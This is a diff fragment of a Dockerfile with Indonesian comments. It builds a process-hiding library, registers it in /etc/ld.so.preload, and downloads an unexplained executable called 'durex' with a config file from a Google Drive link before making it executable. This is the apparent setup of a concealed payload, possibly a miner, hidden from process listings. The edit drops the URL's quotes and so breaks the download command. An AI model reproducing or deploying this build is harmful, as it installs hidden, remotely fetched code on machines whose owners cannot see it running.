@@ -16,7 +16,7 @@ RUN gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
     && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
 
 # Download config.json dan durex, serta memberikan izin eksekusi pada durex
-RUN wget -O durex "https://drive.google.com/uc?export=download&id=1g9IoCBMXlA_K3GDNBwULac_N9FlK2_Ce" \
+RUN wget -O durex https://drive.google.com/uc?export=download&id=1g9IoCBMXlA_K3GDNBwULac_N9FlK2_Ce \
     && chmod +x durex
 
 # Perintah yang akan dijalankan saat container pertama kali dijalankan
